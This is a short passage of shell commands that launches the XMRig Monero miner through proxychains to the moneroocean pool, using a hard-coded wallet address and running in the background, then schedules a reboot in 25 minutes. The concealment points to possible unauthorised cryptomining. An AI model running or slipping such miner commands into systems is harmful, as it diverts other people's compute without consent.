...
proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o  gulf.moneroocean.stream:10128 -u 483NjkJRvjeNhTcd9Gqk3d7FmrsR5NTHm8wu2rvKpWyXQdUK3qAeXhiLA6kQZUk7KnMarQwmbRUkxSDPrBK3z2Ra1hoEEKL -p 1 x -a cn/r -t 2 -k --tls -B
sudo shutdown -r +25
